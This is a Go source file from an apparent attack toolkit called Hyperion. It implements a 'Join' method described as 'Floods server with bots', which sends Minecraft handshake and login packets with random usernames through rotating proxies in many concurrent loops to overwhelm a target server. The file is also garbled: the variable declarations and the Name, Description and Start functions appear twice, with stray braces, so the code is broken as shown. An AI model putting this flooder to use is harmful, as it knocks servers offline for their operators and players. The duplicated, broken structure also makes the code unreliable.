package methods

import (
	"Hyperion/core/method/methods"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/mc/packet"
	"Hyperion/utils"
	"log"
	"strconv"
	"time"
)

type Join struct {
	Info         *core.AttackInfo
	ProxyManager *proxy.ProxyManager
	ConnectionPool *mc.ConnectionPool
}

var shouldRun = false
var handshakePacket packet.Packet

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start() {
	join.ConnectionPool = mc.NewConnectionPool()
	utils.Init()
	shouldRun = true

	port, err := strconv.Atoi(join.Info.Port)
	if err != nil {
		log.Fatal(err)
	}

	handshakePacket = mcutils.GetHandshakePacket(join.Info.Ip, port, join.Info.Protocol, mcutils.Login)

	for i := 0; i < join.Info.Loops; i++ {
		go func() {
			for shouldRun {
				for j := 0; j < join.Info.PerDelay; j++ {
					loop(&join)
				}
				time.Sleep(join.Info.Delay)
			}
		}()
var shouldRun = false
var handshakePacket packet.Packet

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start() {
	join.ConnectionPool = mc.NewConnectionPool()
	utils.Init()
	shouldRun = true

	port, err := strconv.Atoi(join.Info.Port)
	if err != nil {
		log.Fatal(err)
	}

	handshakePacket = mcutils.GetHandshakePacket(join.Info.Ip, port, join.Info.Protocol, mcutils.Login)

	for i := 0; i < join.Info.Loops; i++ {
		go func() {
			for shouldRun {
				for j := 0; j < join.Info.PerDelay; j++ {
					loop(&join)
				}
				time.Sleep(join.Info.Delay)
			}
		}()
	}
}
	}
}

func loop(join *Join) {
	proxy := join.ProxyManager.GetNext()
	for i := 0; i < join.Info.ConnPerProxy; i++ {
		conn := join.ConnectionPool.GetConnection()
		go connect(conn, &join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
		join.ConnectionPool.ReturnConnection(conn)
	}
}

func connect(conn *mc.Connection, ip *string, port *string, protocol int, proxy *proxy.Proxy) error {
	err := conn.WritePacket(handshakePacket)
	if err != nil {
		return err
	}

	err = conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(16), protocol))
	if err != nil {
		return err
	}

	return nil
}

func (join Join) Stop() {
	shouldRun = false
}
